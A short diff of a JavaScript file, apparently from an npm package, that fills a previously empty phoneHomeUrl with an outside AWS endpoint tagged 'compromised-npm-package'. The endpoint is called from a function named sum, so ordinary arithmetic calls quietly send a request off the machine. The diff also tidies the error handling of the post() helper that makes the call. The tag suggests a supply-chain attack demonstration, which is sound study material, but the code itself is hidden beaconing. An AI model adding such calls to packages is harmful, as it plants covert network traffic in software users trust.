@@ -1,6 +1,7 @@
 const https = require('https')
 
-const phoneHomeUrl = ''
+const phoneHomeUrl =
+  'https://khl3d5s1al.execute-api.us-east-1.amazonaws.com/?source=compromised-npm-package'
 
 async function sum(a, b) {
   // phone home
@@ -39,10 +40,12 @@ async function post(url, data) {
       })
     })
 
-    request.on('error', (err) => reject(err))
-    request.on('timeout', (err) => {
-      console.log('timed out', err)
+    req.on('error', (err) => {
       reject(err)
+    })
+    req.on('timeout', () => {
+      req.destroy()
+      reject(new Error('timed out'))
     })
 
     req.write(dataString)
